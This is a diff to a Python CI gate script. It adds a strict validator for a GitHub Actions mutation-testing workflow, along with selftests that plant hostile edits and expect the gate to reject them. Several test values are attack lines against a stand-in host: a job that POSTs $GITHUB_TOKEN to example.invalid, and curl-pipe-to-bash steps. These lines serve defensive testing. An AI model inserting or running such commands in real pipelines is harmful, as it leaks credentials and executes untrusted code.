@@ -500,6 +500,181 @@ def sibling_workflow_jobs_error(data: str) -> str:
     return ""
 
 
+def mutation_workflow_authority_error(data: str) -> str:
+    """Independently close the sweep workflow's authority, jobs, steps, and commands.
+
+    The only authority this workflow carried was a byte comparison against a constant in this
+    file, so three coordinated edits -- the workflow, that constant, and the tracked source
+    digest -- moved together and left the whole gate green while a widened token, an appended
+    job, an inserted step, or a changed shard count reached the runner. Nothing below reads
+    that constant: an oracle that consults the bytes it exists to second-guess repeats them.
+    """
+    checkout = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+    setup = "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97"
+    upload = "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
+    download = "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093"
+    head = "${{ github.event.pull_request.head.sha || github.sha }}"
+
+    top_fields = [
+        line.strip()
+        for line in data.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 0
+    ]
+    if top_fields != ["name: mutation-proof", "on:", "permissions:", "jobs:"]:
+        return "mutation workflow top-level fields permit an unreviewed environment"
+    # The key alone leaves the block's CONTENT unread, and neither job overrides it, so a
+    # widened workflow-level token reaches every shard and the aggregator silently.
+    granted = [
+        line.strip()
+        for line in _yaml_mapping_block(data, "permissions:").splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if granted != ["contents: read"]:
+        return "mutation workflow top-level permissions are not exactly contents:read"
+    trigger = _yaml_mapping_block(data, "on:")
+    if _yaml_fields(trigger, 2) != ["pull_request:", "push:", "workflow_dispatch:"]:
+        return "mutation workflow trigger inventory is not exactly the three reviewed events"
+    if _yaml_fields(_yaml_mapping_block(trigger, "  push:"), 4) != ["branches: [main]"]:
+        return "mutation workflow push trigger is not exactly main"
+    # A selector on either unfiltered event silences the sweep for the heads it excludes, and
+    # the absence of a measurement is not a measurement.
+    for event in ("  pull_request:", "  workflow_dispatch:"):
+        if any(line.strip()
+               for line in _yaml_mapping_block(trigger, event).splitlines()[1:]):
+            return f"mutation workflow {event.strip(' :')} trigger is filtered"
+
+    # Both job lookups precede the inventory so a duplicated job keeps its own diagnosis
+    # instead of being answered by the inventory.
+    shard = _yaml_mapping_block(data, "  mutations:")
+    if not shard:
+        return "mutation shard job is absent or duplicated"
+    aggregate = _yaml_mapping_block(data, "  aggregate:")
+    if not aggregate:
+        return "mutation aggregate job is absent or duplicated"
+    # The jobs mapping is append-open to every closed list built below, because those cover
+    # one named block each and never the mapping that may carry a third sibling.
+    jobs = _yaml_mapping_block(data, "jobs:")
+    job_names = [
+        line.strip()
+        for line in jobs.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 2
+    ]
+    if job_names != ["mutations:", "aggregate:"]:
+        return "mutation workflow job inventory is not exactly closed"
+
+    if _yaml_fields(shard, 4) != [
+            "strategy:", "runs-on: ubuntu-24.04", "timeout-minutes: 90", "steps:"]:
+        return "mutation shard job fields are not exactly the closed contract"
+    strategy = _yaml_mapping_block(shard, "    strategy:")
+    if _yaml_fields(strategy, 6) != ["fail-fast: false", "matrix:"]:
+        return "mutation shard strategy is not exactly fail-fast with one matrix"
+    matrix = _yaml_mapping_block(strategy, "      matrix:")
+    if _yaml_fields(matrix, 8) != ["shard: [0, 1, 2, 3, 4, 5]"]:
+        return "mutation shard matrix is not exactly the six reviewed shards"
+    if _yaml_step_headers(shard) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: install zsh and assert the exact accepted head",
+            "- name: run mutation shard", f"- uses: {upload}"]:
+        return "mutation shard step inventory is not exactly ordered and closed"
+    if _yaml_fields(aggregate, 4) != [
+            "if: always()", "needs: mutations", "runs-on: ubuntu-24.04",
+            "timeout-minutes: 30", "steps:"]:
+        return "mutation aggregate job fields are not exactly the closed contract"
+    if _yaml_step_headers(aggregate) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: install zsh and assert the exact accepted head",
+            "- name: refuse a head whose shards did not all succeed",
+            f"- uses: {download}",
+            "- name: reject incomplete evidence and compare the tracked receipt"]:
+        return "mutation aggregate step inventory is not exactly ordered and closed"
+
+    for label, job in (("shard", shard), ("aggregate", aggregate)):
+        checkout_step = _yaml_mapping_block(job, f"      - uses: {checkout}")
+        checkout_with = _yaml_mapping_block(checkout_step, "        with:")
+        if (_yaml_fields(checkout_step, 8) != ["with:"]
+                or _yaml_fields(checkout_with, 10) != [
+                    "persist-credentials: false", f"ref: {head}"]):
+            return (f"mutation {label} checkout step is not exactly non-persisting at the "
+                    "accepted head")
+        setup_step = _yaml_mapping_block(job, f"      - uses: {setup}")
+        setup_with = _yaml_mapping_block(setup_step, "        with:")
+        if (_yaml_fields(setup_step, 8) != ["with:"]
+                or _yaml_fields(setup_with, 10) != ["python-version: 3.13.14"]):
+            return f"mutation {label} setup-python step is not exactly unconditional"
+        zsh_step = _yaml_mapping_block(
+            job, "      - name: install zsh and assert the exact accepted head")
+        if _yaml_fields(zsh_step, 8) != ["timeout-minutes: 10", "run: |"]:
+            return f"mutation {label} zsh step fields are not exactly bounded"
+        if _yaml_run_commands(zsh_step) != (
+                'APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"',
+                "for attempt in 1 2 3; do",
+                "sudo timeout 120 apt-get update $APT_OPTS || true",
+                "sudo apt-get install -y zsh && break",
+                'echo "apt attempt $attempt did not yield zsh; retrying"',
+                "sleep 10", "done", "zsh --version",
+                f"git rev-parse HEAD | grep -Fx '{head}'"):
+            return (f"mutation {label} zsh command sequence is not exactly bounded and "
+                    "head-asserted")
+
+    receipt_step = _yaml_mapping_block(shard, "      - name: run mutation shard")
+    if _yaml_fields(receipt_step, 8) != ["run: >-"]:
+        return "mutation shard receipt step fields are not exactly one folded command"
+    receipt_command = tuple(
+        line.strip()
+        for line in _yaml_mapping_block(receipt_step, "        run: >-").splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    )
+    if receipt_command != (
+            "python3 tools/write-mutation-receipt.py",
+            "--shard-index ${{ matrix.shard }}",
+            "--shard-count 6",
+            "--fragment mutation-fragment-${{ matrix.shard }}.json",
+            f"--expected-head '{head}'"):
+        return "mutation shard receipt command is not exactly the six-way sharded writer"
+    upload_step = _yaml_mapping_block(shard, f"      - uses: {upload}")
+    upload_with = _yaml_mapping_block(upload_step, "        with:")
+    if (_yaml_fields(upload_step, 8) != ["with:"]
+            or _yaml_fields(upload_with, 10) != [
+                "name: mutation-fragment-${{ matrix.shard }}",
+                "path: mutation-fragment-${{ matrix.shard }}.json",
+                "if-no-files-found: error", "retention-days: 7"]):
+        return "mutation shard fragment upload is not exactly the reviewed evidence upload"
+
+    refusal_step = _yaml_mapping_block(
+        aggregate, "      - name: refuse a head whose shards did not all succeed")
+    if _yaml_fields(refusal_step, 8) != [
+            "if: needs.mutations.result != 'success'", "run: |"]:
+        return "mutation aggregate shard-failure gate fields are not the closed refusal"
+    if _yaml_run_commands(refusal_step) != (
+            'echo "mutations result: ${{ needs.mutations.result }}"', "exit 1"):
+        return "mutation aggregate shard-failure gate does not exit non-zero"
+    download_step = _yaml_mapping_block(aggregate, f"      - uses: {download}")
+    download_with = _yaml_mapping_block(download_step, "        with:")
+    if (_yaml_fields(download_step, 8) != ["with:"]
+            or _yaml_fields(download_with, 10) != [
+                "pattern: mutation-fragment-*", "path: mutation-fragments",
+                "merge-multiple: true"]):
+        return "mutation aggregate fragment download is not exactly the reviewed pattern"
+    comparison_step = _yaml_mapping_block(
+        aggregate,
+        "      - name: reject incomplete evidence and compare the tracked receipt")
+    if _yaml_fields(comparison_step, 8) != ["run: >-"]:
+        return "mutation aggregate comparison step fields are not one folded command"
+    comparison_command = tuple(
+        line.strip()
+        for line in _yaml_mapping_block(
+            comparison_step, "        run: >-").splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    )
+    if comparison_command != (
+            "python3 tools/write-mutation-receipt.py",
+            "--aggregate mutation-fragments/*.json"):
+        return "mutation aggregate comparison command is not tracked-receipt aggregation"
+    return ""
+
+
 def publication_workflow_error(data: str) -> str:
     """Independently close all workflow jobs and the live publication read-back."""
     top_fields = [
@@ -2254,6 +2429,13 @@ def gate(
     )
     if publication_workflow_problem:
         failures.append(publication_workflow_problem)
+    mutation_authority_problem = mutation_workflow_authority_error(mutation_workflow)
+    print(
+        f"  {'FAIL' if mutation_authority_problem else 'PASS'} "
+        "mutation-workflow-authority-contract"
+    )
+    if mutation_authority_problem:
+        failures.append(mutation_authority_problem)
     present = (
         tuple(sorted(p.name for p in WORKFLOW_DIR.iterdir() if p.is_file()))
         if WORKFLOW_DIR.is_dir() else ()
@@ -2876,6 +3058,197 @@ def selftest() -> int:
         all(term not in EXPECTED_MUTATION_WORKFLOW for term in (
             "resweep", "verify-inherited", "needs.scope", "scope:")),
     )
+    expect(
+        "mutation workflow authority baseline matches its independent semantic contract",
+        mutation_workflow_authority_error(EXPECTED_MUTATION_WORKFLOW) == "",
+    )
+
+    def coordinated_sweep_mutation(mutated, diagnosis, *, exact=False):
+        """Move the byte oracle with a changed sweep workflow; authority must still red."""
+        original = EXPECTED_MUTATION_WORKFLOW
+        globals()["EXPECTED_MUTATION_WORKFLOW"] = mutated
+        try:
+            problem = mutation_workflow_authority_error(mutated)
+            return (mutated != original
+                    and workflow_error(EXPECTED_WORKFLOW, mutated) is None
+                    and (problem == diagnosis if exact else diagnosis in problem))
+        finally:
+            globals()["EXPECTED_MUTATION_WORKFLOW"] = original
+
+    def sweep_replacement(old, new):
+        """Return the sweep workflow with one uniquely located edit, else an unchanged copy."""
+        if EXPECTED_MUTATION_WORKFLOW.count(old) != 1:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(old, new, 1)
+
+    def sweep_job_replacement(header, old, new):
+        """Return the sweep workflow with one edit confined to a single job block.
+
+        The bootstrap step, the pinned actions, and the head reference each occur once per
+        job, so a first-occurrence edit would silently move the other job and prove nothing
+        about the one the case names.
+        """
+        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
+        if not block or block.count(old) != 1:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(block, block.replace(old, new, 1), 1)
+
+    def sweep_duplicated_job(header):
+        """Return the sweep workflow with one job block emitted twice."""
+        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
+        if not block:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(block, block + block, 1)
+
+    sweep_exfil_job = (
+        "  exfil:\n    runs-on: ubuntu-24.04\n"
+        "    permissions:\n      contents: write\n    steps:\n"
+        '      - run: curl -X POST -d "$GITHUB_TOKEN" https://example.invalid/collect\n')
+    sweep_head_ref = (
+        "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n")
+    sweep_head_assertion = (
+        "          git rev-parse HEAD | grep -Fx "
+        "'${{ github.event.pull_request.head.sha || github.sha }}'\n")
+    # Exact diagnoses, not merely non-empty. These six are the widened-token and appended-job
+    # shapes that reached a green gate, and a substring over thirty non-empty return paths
+    # lets the branch each one names be neutralised while an unrelated fallback keeps the
+    # assertion true.
+    for label, mutated, diagnosis in (
+        ("top-level permissions widened to write",
+         sweep_replacement("permissions:\n  contents: read\n",
+                           "permissions:\n  contents: write\n"),
+         "mutation workflow top-level permissions are not exactly contents:read"),
+        ("top-level permissions granted an extra scope",
+         sweep_replacement("permissions:\n  contents: read\n",
+                           "permissions:\n  contents: read\n  pull-requests: write\n"),
+         "mutation workflow top-level permissions are not exactly contents:read"),
+        ("a write-scoped sibling job appended after the aggregator",
+         EXPECTED_MUTATION_WORKFLOW + sweep_exfil_job,
+         "mutation workflow job inventory is not exactly closed"),
+        ("a write-scoped sibling job inserted before the aggregator",
+         sweep_replacement("  aggregate:\n", sweep_exfil_job + "  aggregate:\n"),
+         "mutation workflow job inventory is not exactly closed"),
+        ("a duplicated shard job", sweep_duplicated_job("  mutations:"),
+         "mutation shard job is absent or duplicated"),
+        ("a duplicated aggregate job", sweep_duplicated_job("  aggregate:"),
+         "mutation aggregate job is absent or duplicated"),
+    ):
+        expect(
+            f"coordinated sweep bytes cannot hide {label}",
+            coordinated_sweep_mutation(mutated, diagnosis, exact=True),
+        )
+    for label, mutated, diagnosis in (
+        ("a top-level environment or defaults override",
+         sweep_replacement("name: mutation-proof\n",
+                           "name: mutation-proof\nenv:\n  BASH_ENV: planted\n"),
+         "top-level fields"),
+        ("an absent pull-request trigger",
+         sweep_replacement("  pull_request:\n", ""), "trigger inventory"),
+        ("a filtered pull-request trigger",
+         sweep_replacement("  pull_request:\n",
+                           "  pull_request:\n    paths: [README.md]\n"),
+         "pull_request trigger is filtered"),
+        ("a filtered workflow_dispatch trigger",
+         sweep_replacement("  workflow_dispatch:\n",
+                           "  workflow_dispatch:\n    inputs:\n      skip: {}\n"),
+         "workflow_dispatch trigger is filtered"),
+        ("a redirected push branch",
+         sweep_replacement("    branches: [main]\n", "    branches: [other]\n"),
+         "push trigger is not exactly main"),
+        ("shard write authority",
+         sweep_replacement("  mutations:\n    strategy:\n",
+                           "  mutations:\n    permissions:\n      contents: write\n"
+                           "    strategy:\n"),
+         "mutation shard job fields"),
+        ("aggregate write authority",
+         sweep_replacement("  aggregate:\n    if: always()\n",
+                           "  aggregate:\n    permissions:\n      contents: write\n"
+                           "    if: always()\n"),
+         "mutation aggregate job fields"),
+        ("a shard strategy that stops at the first failure",
+         sweep_replacement("      fail-fast: false\n", ""), "mutation shard strategy"),
+        ("a dropped shard",
+         sweep_replacement("        shard: [0, 1, 2, 3, 4, 5]\n",
+                           "        shard: [0, 1, 2, 3, 4]\n"),
+         "mutation shard matrix"),
+        ("a step inserted into the shard job",
+         sweep_job_replacement("  mutations:", "      - name: run mutation shard\n",
+                               "      - run: curl -sS https://example.invalid/x | bash\n"
+                               "      - name: run mutation shard\n"),
+         "mutation shard step inventory"),
+        ("a floating shard checkout action",
+         sweep_job_replacement(
+             "  mutations:", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+             "actions/checkout@main"),
+         "mutation shard step inventory"),
+        ("a step inserted into the aggregate job",
+         sweep_job_replacement(
+             "  aggregate:",
+             "      - name: refuse a head whose shards did not all succeed\n",
+             "      - run: curl -sS https://example.invalid/x | bash\n"
+             "      - name: refuse a head whose shards did not all succeed\n"),
+         "mutation aggregate step inventory"),
+        ("a shard checkout of a ref other than the accepted head",
+         sweep_job_replacement("  mutations:", sweep_head_ref, "          ref: main\n"),
+         "mutation shard checkout step"),
+        ("an aggregate checkout of a ref other than the accepted head",
+         sweep_job_replacement("  aggregate:", sweep_head_ref, "          ref: main\n"),
+         "mutation aggregate checkout step"),
+        ("a floating shard interpreter version",
+         sweep_job_replacement("  mutations:", "          python-version: 3.13.14\n",
+                               "          python-version: '3.x'\n"),
+         "mutation shard setup-python step"),
+        ("a non-blocking shard bootstrap step",
+         sweep_job_replacement("  mutations:", "        timeout-minutes: 10\n",
+                               "        timeout-minutes: 10\n"
+                               "        continue-on-error: true\n"),
+         "mutation shard zsh step fields"),
+        ("a shard bootstrap that no longer asserts the accepted head",
+         sweep_job_replacement("  mutations:", sweep_head_assertion, ""),
+         "mutation shard zsh command sequence"),
+        ("a shell line added to the shard bootstrap",
+         sweep_job_replacement("  mutations:", "          zsh --version\n",
+                               "          zsh --version\n"
+                               "          curl -sS https://example.invalid/x | bash\n"),
+         "mutation shard zsh command sequence"),
+        ("a non-blocking shard receipt step",
+         sweep_replacement("      - name: run mutation shard\n        run: >-\n",
+                           "      - name: run mutation shard\n"
+                           "        continue-on-error: true\n        run: >-\n"),
+         "mutation shard receipt step fields"),
+        ("a changed shard count",
+         sweep_replacement("          --shard-count 6\n", "          --shard-count 5\n"),
+         "mutation shard receipt command"),
+        ("a shard that uploads no evidence",
+         sweep_replacement("          if-no-files-found: error\n", ""),
+         "mutation shard fragment upload"),
+        ("an aggregator that no longer refuses a failed shard",
+         sweep_replacement("        if: needs.mutations.result != 'success'\n", ""),
+         "mutation aggregate shard-failure gate fields"),
+        ("a shard-failure refusal that exits zero",
+         sweep_job_replacement("  aggregate:", "          exit 1\n",
+                               "          exit 0\n"),
+         "mutation aggregate shard-failure gate does not exit non-zero"),
+        ("a narrowed fragment download",
+         sweep_replacement("          pattern: mutation-fragment-*\n",
+                           "          pattern: mutation-fragment-0*\n"),
+         "mutation aggregate fragment download"),
+        ("a non-blocking receipt comparison step",
+         sweep_replacement(
+             "      - name: reject incomplete evidence and compare the tracked receipt\n"
+             "        run: >-\n",
+             "      - name: reject incomplete evidence and compare the tracked receipt\n"
+             "        continue-on-error: true\n        run: >-\n"),
+         "mutation aggregate comparison step fields"),
+        ("a receipt comparison over one named fragment",
+         sweep_replacement("          --aggregate mutation-fragments/*.json\n",
+                           "          --aggregate mutation-fragments/one.json\n"),
+         "mutation aggregate comparison command"),
+    ):
+        expect(
+            f"coordinated sweep bytes cannot hide {label}",
+            coordinated_sweep_mutation(mutated, diagnosis),
+        )
     expect(
         "workflow source-bound bootstrap removal fails",
         workflow_error(EXPECTED_WORKFLOW.replace(
@@ -4487,6 +4860,16 @@ def selftest() -> int:
         )
     finally:
         globals()["publication_workflow_error"] = original_publication_workflow
+    original_mutation_authority = mutation_workflow_authority_error
+    globals()["mutation_workflow_authority_error"] = (
+        lambda _data: "planted mutation-workflow authority failure")
+    try:
+        expect(
+            "production gate adopts the independent mutation workflow authority result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["mutation_workflow_authority_error"] = original_mutation_authority
     # Both new checks were wired into gate() without a plant, so deleting the call or the
     # append left the suite green while the gate printed FAIL and exited 0.
     original_workspace_doctrine = workspace_doctrine_error
